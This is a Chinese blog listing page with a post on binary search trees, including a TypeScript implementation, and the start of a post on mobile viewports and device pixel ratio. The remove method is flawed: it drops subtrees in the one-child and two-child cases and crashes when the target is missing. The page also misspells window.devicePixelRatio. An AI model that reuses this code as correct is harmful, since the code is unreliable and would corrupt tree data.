      <p><p>数组的搜索比较方便，可以直接使用下标，但删除或者插入就比较麻烦了，而链表与之相反，删除和插入都比较简单， 但是查找很慢，这自然也与这两种数据结构的存储方式有关，数组是取一段相连的空间，而链表是每创建一个节点便取一个节点所需的空间，<br>只是使用指针进行连接，空间上并不是连续的。而二叉树就既有链表的好处，又有数组的优点。 </p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>二叉搜索树作为一种经典的数据结构，它既有链表的快速插入与删除操作的特点，又有数组快速查找的优势；所以应用十分广泛，例如在文件系统和数据库系统一般会采用这种数据结构进行高效率的排序与检索操作。</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>在二叉搜索树中：</p>
<ul>
<li>若任意结点的左子树不空，则左子树上所有结点的值均不大于它的根结点的值。 </li>
<li>若任意结点的右子树不空，则右子树上所有结点的值均不小于它的根结点的值。 </li>
<li>任意结点的左、右子树也分别为二叉搜索树。</li>
</ul>
<h2 id="TS实现"><a href="#TS实现" class="headerlink" title="TS实现"></a>TS实现</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * 二叉搜索树接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> BinarySearchTreeImpl &#123;</span><br><span class="line">    <span class="attr">insert</span>: <span class="function">(<span class="params">value: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    remove: <span class="function">(<span class="params">target: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    search: <span class="function">(<span class="params">target: <span class="built_in">number</span></span>) =&gt;</span> TreeNode | <span class="literal">null</span>;</span><br><span class="line">    getRoot: <span class="function">() =&gt;</span> TreeNode;</span><br><span class="line">    getMin: <span class="function">() =&gt;</span> TreeNode;</span><br><span class="line">    getMax: <span class="function">() =&gt;</span> TreeNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * 树节点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> value: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">public</span> left: TreeNode | <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> right: TreeNode | <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">        <span class="built_in">this</span>.left = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * 二叉搜索树</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinarySearchTree</span> <span class="title">implements</span> <span class="title">BinarySearchTreeImpl</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> root: TreeNode | <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">val</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.root) &#123;</span><br><span class="line">            <span class="built_in">this</span>.root = <span class="keyword">new</span> TreeNode(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PRE_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(node.value);</span><br><span class="line">        <span class="built_in">this</span>.PRE_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">this</span>.PRE_ORDER_TRAVERSE(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 中序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IN_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">this</span>.IN_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">console</span>.log(node.value);</span><br><span class="line">        <span class="built_in">this</span>.IN_ORDER_TRAVERSE(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 后序遍历</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> POST_ORDER_TRAVERSE(node: TreeNode): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">this</span>.POST_ORDER_TRAVERSE(node.left);</span><br><span class="line">        <span class="built_in">this</span>.POST_ORDER_TRAVERSE(node.right);</span><br><span class="line">        <span class="built_in">console</span>.log(node.value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取根节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">getRoot</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">insert</span>(<span class="params">value: <span class="built_in">number</span></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> node = <span class="keyword">new</span> TreeNode(value);</span><br><span class="line">        <span class="keyword">let</span> curNode = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="keyword">let</span> preNode;</span><br><span class="line">        <span class="comment">// 先找到插入的位置</span></span><br><span class="line">        <span class="keyword">while</span> (curNode) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curNode.value === node.value) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curNode.value &gt; node.value) &#123;</span><br><span class="line">                preNode = curNode;</span><br><span class="line">                curNode = curNode.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curNode.value &lt; node.value) &#123;</span><br><span class="line">                preNode = curNode;</span><br><span class="line">                curNode = curNode.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 插入节点</span></span><br><span class="line">        <span class="keyword">if</span> (preNode.value &gt; node.value) &#123;</span><br><span class="line">            preNode.left = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preNode.value &lt; node.value) &#123;</span><br><span class="line">            preNode.right = node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除节点</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="title">remove</span>(<span class="params">target: <span class="built_in">number</span></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.root) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 当前遍历的节点</span></span><br><span class="line">        <span class="keyword">let</span> curNode = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="comment">// 要删除的目标节点是其父节点的左子节点还是右子节点</span></span><br><span class="line">        <span class="keyword">let</span> isLeft = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 要删除的目标节点</span></span><br><span class="line">        <span class="keyword">let</span> targetNode;</span><br><span class="line">        <span class="comment">// 要删除的目标节点的父节点</span></span><br><span class="line">        <span class="keyword">let</span> preNode = curNode;</span><br><span class="line">        <span class="comment">// 找到对应的节点</span></span><br><span class="line">        <span class="keyword">while</span> (curNode) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curNode.value === target) &#123;</span><br><span class="line">                targetNode = curNode;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curNode.value &gt; target) &#123;</span><br><span class="line">                preNode = curNode;</span><br><span class="line">                isLeft = <span class="literal">true</span>;</span><br><span class="line">                curNode = curNode.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curNode.value &lt; target) &#123;</span><br><span class="line">                preNode = curNode;</span><br><span class="line">                isLeft = <span class="literal">false</span>;</span><br><span class="line">                curNode = curNode.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 目标节点是叶子节点，无左右子节点，直接删除</span></span><br><span class="line">        <span class="keyword">if</span> (!curNode.left &amp;&amp; !curNode.right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeft) &#123;</span><br><span class="line">                preNode.left = <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preNode.right = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 目标节点有左节点，无右节点</span></span><br><span class="line">        <span class="keyword">if</span> (curNode.left &amp;&amp; !curNode.right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeft) &#123;</span><br><span class="line">                preNode.left.value = curNode.left.value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preNode.right.value = curNode.left.value;</span><br><span class="line">            &#125;</span><br><span class="line">            curNode.left = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 目标节点有右节点，无左节点</span></span><br><span class="line">        <span class="keyword">if</span> (!curNode.left &amp;&amp; curNode.right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeft) &#123;</span><br><span class="line">                preNode.left.value = curNode.right.value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preNode.right.value = curNode.right.value;</span><br><span class="line">            &#125;</span><br><span class="line">            curNode.right = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 目标节点处于中间位置，存在左子节点也存在右子节点</span></span><br><span class="line"><span class="comment">         * 可以有以下两种处理方式：</span></span><br><span class="line"><span class="comment">         * 1、找到当前要删除节点左子树中最大的节点与要删除的节点进行替换</span></span><br><span class="line"><span class="comment">         * 2、找到当前要删除节点右子树中最小的节点与要删除的节点进行替换</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 以第一种方式为例，用即将删除节点的左子树中最大的节点与将要删除的节点替换，存在以下两种情况：</span></span><br><span class="line"><span class="comment">         * a.当前左子树根节点无右子树或者右节点：直接将左子树的根节点替换到删除的节点，并且将删除节点的右子树挂到当前左子树的根节点上</span></span><br><span class="line"><span class="comment">         * b.当前左子树根节点存在右子树或者右节点：找到左子树中的最大节点，用该最大节点去替换删除节点，并将删除节点的右子树挂到该最大节点上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (curNode.left &amp;&amp; curNode.right) &#123;</span><br><span class="line">            <span class="keyword">let</span> tempCurNode = curNode.left;</span><br><span class="line">            <span class="keyword">let</span> tempPreNode = curNode;</span><br><span class="line">            <span class="comment">// 找到左子树中当前的最大值</span></span><br><span class="line">            <span class="keyword">while</span> (tempCurNode.right) &#123;</span><br><span class="line">                tempPreNode = tempCurNode;</span><br><span class="line">                tempCurNode = tempCurNode.right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (tempPreNode === curNode) &#123;</span><br><span class="line">                <span class="comment">// 当前左子树根节点无右子树或者右节点：直接将左子树的根节点替换到删除的节点，并且将删除节点的右子树挂到当前左子树的根节点上</span></span><br><span class="line">                tempCurNode.right = curNode.right;</span><br><span class="line">                <span class="keyword">if</span> (isLeft) &#123;</span><br><span class="line">                    preNode.left = tempCurNode;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    preNode.right = tempCurNode;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 当前左子树根节点存在右子树或者右节点：找到左子树中的最大节点，用该最大节点去替换删除节点，并将删除节点的右子树挂到该最大节点上</span></span><br><span class="line">                curNode.value = tempCurNode.value;</span><br><span class="line">                tempPreNode.right = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 搜索目标节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> search(target: <span class="built_in">number</span>): TreeNode | <span class="literal">null</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="keyword">while</span> (node) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node.value === target) &#123;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &gt; target) &#123;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &lt; target) &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最小节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> getMin(): TreeNode &#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="keyword">while</span> (node.left) &#123;</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最大节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> getMax(): TreeNode &#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="built_in">this</span>.root;</span><br><span class="line">        <span class="keyword">while</span> (node.right) &#123;</span><br><span class="line">            node = node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * test</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> bst = <span class="keyword">new</span> BinarySearchTree(<span class="number">10</span>);</span><br><span class="line">bst.insert(<span class="number">5</span>);</span><br><span class="line">bst.insert(<span class="number">15</span>);</span><br><span class="line">bst.insert(<span class="number">3</span>);</span><br><span class="line">bst.insert(<span class="number">8</span>);</span><br><span class="line">bst.insert(<span class="number">1</span>);</span><br><span class="line">bst.insert(<span class="number">4</span>);</span><br><span class="line">bst.insert(<span class="number">6</span>);</span><br><span class="line">bst.insert(<span class="number">9</span>);</span><br><span class="line">bst.insert(<span class="number">13</span>);</span><br><span class="line">bst.insert(<span class="number">20</span>);</span><br><span class="line">bst.insert(<span class="number">11</span>);</span><br><span class="line">bst.insert(<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">bst.remove(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">BinarySearchTree.IN_ORDER_TRAVERSE(bst.getRoot());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/09/bst/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/08/viewport/">移动端适配总结</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-08</span>
      <p><p>如果下面这行代码经常见到，但又对其一知半解，那么这篇文章也许可以帮你解惑</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="一、基础知识梳理"><a href="#一、基础知识梳理" class="headerlink" title="一、基础知识梳理"></a>一、基础知识梳理</h2><h3 id="1-1、像素"><a href="#1-1、像素" class="headerlink" title="1.1、像素"></a>1.1、像素</h3><h4 id="a-物理像素"><a href="#a-物理像素" class="headerlink" title="a.物理像素"></a>a.物理像素</h4><p>物理像素也就是移动设备中所提到的分辨率，比如手机的分辨率为<code>750x1334</code>像素，其指的是屏幕的垂直方向上有<code>1334</code>个物理像素块，水平方向上有<code>750</code>个像素块。其分辨率越高，所展示的图像就越清晰。</p>
<h4 id="b-设备独立像素-device-independent-pixels-CSS像素"><a href="#b-设备独立像素-device-independent-pixels-CSS像素" class="headerlink" title="b.设备独立像素(device-independent pixels)/CSS像素"></a>b.设备独立像素<code>(device-independent pixels)</code>/CSS像素</h4><p>设备的独立像素，不同于物理像素，更多指的是设计稿中的尺寸，比如设计稿中一个Img的宽高为<code>100x100</code>像素，这个就是独立像素，也对应于css像素，是虚拟化的。</p>
<p>那么，可能会有疑问，这手机分辨率有<code>750x1334</code>像素，但是屏幕大小只有<code>375x667</code>像素，这两者有什么关系呢？</p>
<p>这里就需要引入css像素，也就是设备独立像素。css像素中1px可以代表多个物理像素，在dpr为2的手机中，CSS <code>1px</code>可以对应2个物理像素，也就是相比于分辨率为<code>375x667</code>的手机来说，<code>750x1334</code>分辨率的手机会更加清晰细腻。</p>
<p>如下图所示：这是<code>dpr = 2</code>的情况，最外框为css的<code>1px</code>，但其却覆盖了4个物理像素（蓝色的小方块）</p>
<img src="/images/viewport/1.png" width = "100" alt="1" align=center />

<p>当用户缩小时：物理像素（蓝色小方块）是不会改变的，此时一个物理像素从原来只覆盖1/4的CSS像素变成了可覆盖大于7/10的CSS像素，相当于一个物理像素所能展示的CSS像素更多，所以用户所能看到的内容也更多，但图像变小</p>
<img src="/images/viewport/2.png" width = "100" alt="1" align=center />

<p>反之，当用户放大时：原来一个CSS像素仅需要4个物理像素便能展示，放大后一个CSS像素所需的物理像素可能要8-9个（大概），所以能展示的CSS像素变少，图像变大，用户所能看到的内容也就变少了</p>
<img src="/images/viewport/3.png" width = "100" alt="1" align=center />

<h3 id="1-2、设备像素比dpr"><a href="#1-2、设备像素比dpr" class="headerlink" title="1.2、设备像素比dpr"></a>1.2、设备像素比dpr</h3><p><code>dpr=物理像素/独立像素</code>，通过js可以获取：<code>window.devicesPixelRatio</code>。</p>
<h2 id="二、视口viewport"><a href="#二、视口viewport" class="headerlink" title="二、视口viewport"></a>二、视口viewport</h2><h3 id="2-1、PC与移动端的视口viewport"><a href="#2-1、PC与移动端的视口viewport" class="headerlink" title="2.1、PC与移动端的视口viewport"></a>2.1、PC与移动端的视口viewport</h3><h4 id="2-1-1、PC端视口"><a href="#2-1-1、PC端视口" class="headerlink" title="2.1.1、PC端视口"></a>2.1.1、PC端视口</h4><p>在<code>html</code>、<code>body</code>设置<code>width:100%;height:100%;</code>的时候，它并不是无效的。100%这种百分数应该是继承父元素而来的。那在这里是继承哪里的呢？</p>
<p>在PC浏览器中，有一个用来约束CSS布局视口的东西，又叫做初始包含块。这也就是所有宽高继承的由来。除去<code>margin</code>、<code>padding</code>，浏览器布局视口<code>layout viewport</code>和可视窗口<code>visual viewport</code>宽高是一致的，统称为视口<code>viewport</code>，同时也和浏览器本身的宽度一致。</p>
<p>举个例子：下图中，当前浏览器的宽度<code>1365px</code>，则相应的body宽度也为<code>1365px</code>，文字显示正常，阅读无障碍</p>
<p>通过<code>document.documentElement.clientWidth</code>可以获取布局视口。</p>
<img src="/images/viewport/4.png" width = "800" alt="1" align=center />



<h4 id="2-2、移动端"><a href="#2-2、移动端" class="headerlink" title="2.2、移动端"></a>2.2、移动端</h4><h5 id="2-2-1、布局视口"><a href="#2-2-1、布局视口" class="headerlink" title="2.2.1、布局视口"></a>2.2.1、布局视口</h5><img src="/images/viewport/5.png" width = "400" alt="1" align=center />


<p>在移动端，默认的情况下，移动端浏览器厂商为了让用户在小屏幕下传统的PC网页也能够很好地展示，一般会把布局视口宽度设置地很大去存放页面，在<code>768px ~ 1024px</code>之间，最常见的宽度是<code>980px</code>。这个宽度可以通过<code>document.documentElement.clientWidth</code>得到。</p>
<h5 id="2-2-2、视觉视口"><a href="#2-2-2、视觉视口" class="headerlink" title="2.2.2、视觉视口"></a>2.2.2、视觉视口</h5><img src="/images/viewport/6.png" width = "400" alt="1" align=center />


<p>对于视觉视口来说，这个东西是呈现给用户的，它是用户看到网页区域内CSS像素的数量。（CSS像素的数量越多，说明展示的页面元素越多，看到的页面元素也就越小）</p>
<p>值得注意的是，在移动端缩放不会改变布局视口的宽度，当缩小的时候，屏幕覆盖的css像素变多，视觉视口变大，看到的字体图形字体变小，反之亦然。</p>
<p>而在PC端，缩放对应布局宽度和视觉窗口宽度都是联动的。而浏览器宽度本身是固定的，无论怎么缩放都不受影响。</p>
<h5 id="2-2-3、视口缺陷"><a href="#2-2-3、视口缺陷" class="headerlink" title="2.2.3、视口缺陷"></a>2.2.3、视口缺陷</h5><img src="/images/viewport/7.png" width = "400" alt="1" align=center />

<p>从上图可以看到，用户手机屏幕所展示的内容（<code>visual viewport</code>）仅占了<code>layout viewport</code>的一部分，并不能全部展示出来。</p>
<p>通过<code>chrome</code>模拟出手机的屏幕</p>
<p>如上图所示，布局视口的宽度（这里<code>body</code>被默认设置成了<code>980px</code>）是要远远大于移动端浏览器的宽度(<code>360px</code>)的。大多数浏览器会默认铺开整个布局视口到整个屏幕中，导致页面中的字体非常小，阅读体验非常差。</p>
<p>试想一下，如果一个网页不对移动端进行适配，用户进行阅读的时候，由于字体太小，就不得不手动放大以便于阅读，但是放大的时候另外一个问题又出现了：</p>
<img src="/images/viewport/8.png" width = "400" alt="1" align=center />

<p>从上图中可以看到，虽然文字变大了，但是相应的，屏幕中所显示的信息也变少了，用户需要手动去滑动整个页面让目标信息展示出来。</p>
<h5 id="2-2-4、理想视口"><a href="#2-2-4、理想视口" class="headerlink" title="2.2.4、理想视口"></a>2.2.4、理想视口</h5><p>所以后来苹果引入了理想视口的概念，它对设备来说是最理想的布局视口尺寸，用户进入页面时就不需要手动再去缩放页面。</p>
<p>所以便有了这段代码：</p>
